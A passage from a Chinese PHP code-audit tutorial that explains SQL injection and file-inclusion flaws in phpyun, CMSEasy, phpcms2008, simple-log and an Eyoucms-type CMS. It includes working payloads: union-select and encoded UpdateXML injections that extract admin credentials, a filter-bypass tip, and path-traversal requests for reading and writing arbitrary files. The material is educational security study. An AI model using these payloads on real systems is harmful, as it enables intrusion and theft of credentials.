字符串载入对象中。
然后通过对象名赋值给其它变量$fromUsername 等
继续往下读：
- 55 -
if($MsgType=='event')
{
$MsgEvent = $postObj->Event;
if ($MsgEvent=='subscribe')
{
$centerStr =
"config['sy_webname'])."！\n
1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售
XX 公司】查找您想要的职位\n 绑定您的账户体验更多精彩功能\n 感
谢您的关注！]]>";
$this->MsgType =
'text';
}elseif
($MsgEvent=='CLICK')
{
$EventKey =
$postObj->EventKey;
if($EventKey=='myaccount'){
$centerStr =
$this->bindUser($fromUsername);
}elseif($EventKey=='我的消息')
{
$centerStr =
$this->myMsg($fromUsername);
- 56 -
}elseif($EventKey=='面试邀请')
{
$centerStr =
$this->Audition($fromUsername);
}elseif($EventKey=='简历查看')
{
$centerStr =
$this->lookResume($fromUsername);
}elseif($EventKey=='刷新简历')
{
$centerStr =
$this->refResume($fromUsername);
}elseif($EventKey=='推荐职位')
{
$centerStr =
$this->recJob();
}elseif($EventKey=='职位搜索'){
$centerStr = "";
$this->MsgType = 'text';
}
}
}elseif($MsgType=='text'){
if($keyword){
$centerStr =
$this->searchJob($keyword);
}
}
$topStr = sprintf($topTpl,
$fromUsername, $toUsername, $times, $this->MsgType);
- 57 -
echo
$topStr.$centerStr.$bottomStr;
}
}
}
这里先判断类型，如果点击，$MsgEvent==’CLICK’ 则会调
用 bindUser（）方法。
原本这段代码判断是否 我的帐号信息，但在环境搭建后可能是编码原
因，一直复现不成功，所以这里我改成了 myaccount 所以才会去执行
bindUser()方法
if($EventKey=='myaccount'){
$centerStr =
$this->bindUser($fromUsername);
这里调用了这个 bindUser()方法，所以这里跟进一下这个方法是做什
么的。
Code:286
private function bindUser($wxid='')
{
$bindType = $this->isBind($wxid);
$this->MsgType = 'text';
return $bindType['cenetrTpl'];
}
将$wxid 这个参数又传给了 isBind()方法进行处理。
继续跟进 isBind()方法：
Code:295
private function isBind($wxid='')
{
if($wxid)
- 58 -
{
$User =
$this->obj->DB_select_once("member","`wxid`='".$wxid."'
","`uid`,`username`");
}
if($User['uid']>0)
{
$User['bindtype'] = '1';
$User['cenetrTpl'] =
"config['sy_webname'])."帐
号：".$User['username']."已成功绑定！ \n\n\n 您也可以config['sy_weburl']."/wap/index.php?m=l
ogin&wxid=".$wxid."\">点击这里进行解绑或绑定其他帐
号]]>";
}else{
$Token = $this->getToken();
$Url =
'https://api.weixin.qq.com/cgi-bin/user/info?access_tok
en='.$Token.'&openid='.$wxid.'&lang=zh_CN';
$CurlReturn
=
$this->CurlPost($Url);
$UserInfo
=
json_decode($CurlReturn);
$wxid
= $wxid;
$wxname
=
$UserInfo->nickname;
$this->config['token_time'] =
time();
$User['cenetrTpl'] =
'config['sy_weburl'].'/wap/index.php?m=lo
gin&wxid='.$wxid.'">点击这里进行绑定!]]>';
}
- 59 -
return $User;
}
这里传过来的$wxid 直接进入到了 DB_select_once 方法中。 这里继
续跟进 DB_select_once 是否有进行过滤等。如果没有过滤则存在 sql
注入
File:/Module/class/action.class.php
Code:53
function DB_select_once($tablename, $where = 1, $select =
"*") {
$cachename=$tablename.$where;
if(!$return=$this->Memcache_set($cachename)){
$SQL = "SELECT $select FROM " .
$this->def . $tablename . " WHERE $where limit 1";
$query = $this->db->query($SQL);
$return=$this->db->fetch_array($query);
$this->Memcache_set($cachename,$return);
}
return $return;
所以没有过滤产生了注入工攻击
漏洞利用方法：
- 60 -
http://192.168.0.108/phpyun3/weixin/index.php?m=index&c=inde
x
POST:
1111
1111' and 1=2 union select 1,(select
concat(username,password) from phpyun_admin_user limit
0,1)#
1402550611
event
CLICK
myaccount
0
这里提交将会被拦
- 61 -
通过 tamper Data 来突破
添加一个：Content-Type:text/xml;
- 62 -
提交，查看源代码查看密码：
- 63 -
cmseasy 无限制报错注入
作者：loopx9
File:xajax.class.php
if ($rootTag == "xjxquery") {
$sQuery = "";
$this->iPos++;
while (!stristr($this->aObjArray[$this->iPos], "")) {
if (stristr($this->aObjArray[$this->iPos], "") ||
stristr($this->aObjArray[$this->iPos], "")) {
$this->iPos++;
continue;
}
$sQuery .= $this->aObjArray[$this->iPos];
$this->iPos++;
}
parse_str($sQuery, $aArray);
if ($this->bDecodeUTF8Input) {
foreach ($aArray as $key => $value) {
$aArray[$key] = $this->_decodeUTF8Data($value);
}
}
if (get_magic_quotes_gpc() == 1) {
$newArray = array();
- 64 -
foreach ($aArray as $sKey => $sValue) {
if (is_string($sValue))
$newArray[$sKey] = stripslashes($sValue);
else
$newArray[$sKey] = $sValue;
}
$aArray = $newArray;
}
}
return $aArray;
}
问题发生在哪里了：
parse_str($sQuery, $aArray);
这个函数，本身会对 url 编码进行一次 decode 的
测试一下
";
parse_str($_GET['b']);
echo $a;
?>
- 65 -
第二处逻辑
如果 gpc 开启的话，它会进行一次 stripslashes
if (get_magic_quotes_gpc() == 1) {
$newArray = array();
foreach ($aArray as $sKey => $sValue) {
if (is_string($sValue))
$newArray[$sKey] =
stripslashes($sValue);
以往的 注册函数有两个前台可以利用：
Postdata 和 LiveMessage
看看 LiveMessage：
function LiveMessage($a) {
global $db;
$sessionid = $_SESSION['sessionid'];
$name = addslashes(htmlspecialchars($a['name']));
$email =
addslashes(htmlspecialchars($a['email']));
$country =
addslashes(htmlspecialchars($a['country']));
$phone =
addslashes(htmlspecialchars($a['phone']));
$departmentid =
addslashes(htmlspecialchars($a['departmentid']));
$message =
addslashes(htmlspecialchars($a['message']));
所有的参数都被 addslashes
我们在看看：
Postdata
- 66 -
function Postdata($a) {
global $db;
$chatid = $_SESSION['chatid'];
$name = $_SESSION['name'];
$a['detail'] = htmlspecialchars($a['detail']);
if (!get_magic_quotes_gpc()) {
$a['detail'] = addslashes($a['detail']);
}
如果 gpc 开启的话，就不进行 addslashes 好的 直接 exp
发送 url:
http://localhost/Cmseasy/celive/live/header.php
postdata:
xajax=Postdata&xajaxargs[0]=detail=xxxxxx
%2527%252C%2528UpdateXML%25281%252CCONCAT%252
80x5b%252Cmid%2528%2528SELECT%252f%252a%252a%
252fGROUP_CONCAT%2528concat%2528username%252C%2
527%257C%2527%252Cpassword%2529%2529%2520from%
2520cmseasy_user%2529%252C1%252C32%2529%252C0x5
d%2529%252C1%2529%2529%252CNULL%252CNULL%252
CNULL%252CNULL%252CNULL%252CNULL%2529--%2520
练习题：
1.注入有几种类型？
2.是否所有数据库都受到 SQL 注入？
- 67 -
实践：通过 sqli-labs 练习一下
https://github.com/Audi-1/sqli-labs
文件包含
文件包含漏洞即当程序员在包含文件的过程中引入了外部提交的
数据参与包含的过程所产生的漏洞，这个漏洞是目前 Web 攻击中最利
- 68 -
用率最高的一个漏洞，攻击者 可以轻松获取服务器的访问权限（即拿
到 webshell）。而文件包含通常又有本地文件包含
（Local File Inclusion）和远程文件包含(Remote File Inclusion)
之分。allow_url_fopen 和 allow_url_include 是决定包含属于本地文
件包含（LFI）还是远程文件包含 （RFI）的条件，在 PHP4 中则只有
一个 allow_url_fopen 选择。其中 allow_url_fopen
和 allow_url_include 为 0n 的情况为远程文件包含漏洞，相反为本地
文件包含漏洞。
什么才是“远程文件包含漏洞”？
服务器通过 php 的特性（函数）去包含任意文件时，由于要包含
的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可
以构造这个恶意文件来达到邪恶的目的。
涉及到的危险函数：
include（）
require（）
include_once（）
require_once（）
Include：包含并运行指定文件，当包含外部文件发生错误时，系
统给出警告，但整个 php 文件继续执行。
Require：跟 include 唯一不同的是，当产生错误时候，include
下面继续运行而 require 停止运行了。
Include_once：这个函数跟 include 函数作用几乎相同，只是他
在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么
就不重复执行了。
- 69 -
Require_once：这个函数跟 require 的区别 跟上面我所讲的
include 和 include_once 是一样的。所以我就不重复了。
phpcms2008 本地文件包括及利用
作者：Jannock
文件 wap/index.php
include '../include/common.inc.php';
include './include/global.func.php';
$lang = include './include/lang.inc.php';
if(preg_match('/(mozilla|m3gate|winwap|openwave)/i',
$_SERVER['HTTP_USER_AGENT']))
{
header('location:../');
}
wmlHeader($PHPCMS['sitename']);
$action = isset($action) && !empty($action) ? $action : 'index';
if($action)
{
include './include/'.$action.'.inc.php';
}
$html = CHARSET != 'utf-8' ? iconv(CHARSET, 'utf-8', $html) :
$html;
- 70 -
echo str_replace('', "\n", $html);
wmlFooter();
?>
action 变量没有判断，造成本地文件包含漏洞。
利用（其中之一）：
包含目录 include\fields\areaid 下任一文件，即可执行任意 SQL 脚本。
如：field_add.inc.php
if(!$maxlength) $maxlength = 255;
$maxlength = min($maxlength, 255);
$sql = "ALTER TABLE `$tablename` ADD `$field`
VARCHAR( $maxlength ) NOT NULL DEFAULT '$defaultvalue'";
$db->query($sql);
?>
tablename 等变量可以直接传入。 当然，这个访问需要用 Opera 等浏
览器访问。
用 Opera 浏览器访问
http://www.phpcms.cn/wap/index.php?action=../../include/fields/a
reaid/field_add&tablename=xx
simple-log 后台任意文件读写漏洞
作者：风眼哥
在/admin/includes/set_page.php 中：
产生读任意文件的地方：
elseif ($action=='get_page_data')
{
require(PBBLOG_ROOT . '/includes/json.class.php');
$json
= new JSON;
$file=$_POST['template_file'];
$res=array('type'=>'get_page_data','content'=>'','error'=>'no');
- 71 -
$data=file_get_contents(PBBLOG_ROOT.'/themes/'.$config['template_
name'].'/'.$file);
$res['content']=$data;
die($json->encode($res));
}
$_POST['template_file']被传给了$file 然后直接字符串拼接进入
file_get_contents 中导致读任意文件漏洞的产生
产生写任意文件的地方：
elseif ($action=='act_set_page')
{
$data=htmlspecialchars_decode(stripslashes($_POST['data']));
$file=$_POST['template_file'];
$fp=@fopen(PBBLOG_ROOT.'/themes/'.$config['template_name'].'/'.
$file,"w") or die('can not open file');
flock($fp,LOCK_EX);
fwrite($fp,$data);
fclose($fp);
clear_tpl();
sys_message('页面修改成功','admin.php?act=set_footer&file='.$file);
}
同理也是
$_POST['template_file']被传给了$file 然后直接字符串拼接进入
file_get_contents 中导致写任意文件漏洞的产生
读 index.php 文件
POST /simple-log/admin/admin.php?act=get_page_data HTTP/1.1
Host: xxx
User-Agent: xxx
- 72 -
Accept: application/json, text/javascript, */*
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://xxx/simple-log/admin/admin.php?act=set_footer&file=blog.html
Content-Length: 23
Cookie: xxx
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
template_file=../index.php
易酷 cms 本地包含导致 getwebshell
作者：Bhunter
漏洞文件：core\Lib\Action\Home\MyAction.class.php
class MyAction extends HomeAction{
public function index(){
$this->show();
}
public function show(){
$id = !empty($_GET['id'])?$_GET['id']:'hot';
$this->display('my_'.trim($id));漏洞点
}
}
?>